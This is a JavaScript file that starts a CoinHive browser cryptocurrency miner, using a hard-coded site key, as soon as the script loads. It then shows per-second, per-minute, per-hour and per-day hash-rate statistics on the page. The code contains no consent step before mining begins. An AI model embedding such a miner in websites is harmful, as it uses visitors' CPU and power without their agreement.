var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
miner.setNumThreads(1);
miner.start();

// Listen on events
// miner.on('found', function () { insertToLog("Found hash"); });
// miner.on('accepted', function () { insertToLog("Accepted hash"); });

function Memory(id, maxCount, toSec) {
    id = "." + id;
    var counter = 0;
    var sum = 0;
    var memory = [];

    this.id = function(){
        return id;
    };

    this.count = function () {
        counter++;
        var result = counter >= maxCount;
        if(result) counter = 0;
        return result;
    };

    this.add = function(item) {
        sum += item;
        memory.push(item);
        if(memory.length > maxCount)
            sum -= memory.shift();
        return sum;
    };

    this.getPerX = function() {
        return Math.round(sum);
    };

    this.getPerSec = function() {
        var one = memory.length === maxCount ? sum : sum / memory.length * maxCount;
        return Math.round(one * toSec);
    };
}

var memory = [
    new Memory("nsec", 1, 1),
    new Memory("nmin", 60, 1/60),
    new Memory("nhour", 60, 1/60/60),
    new Memory("nday", 24, 1/60/60/24)
];
var sum = 0;
setInterval(function () {
    var value = miner.getHashesPerSecond();
    sum += value;
    for (var i = 0; i < memory.length; i++) {
        var item = memory[i];
        value = item.add(value);
        if(i === 0)
            $(item.id()).text(Math.round(sum) + " (" + item.getPerSec() + "/s)");
        else
            $(item.id()).text(item.getPerX() + " (" + item.getPerSec() + "/s)");
        if (!item.count()) break;
    }
}, 1000);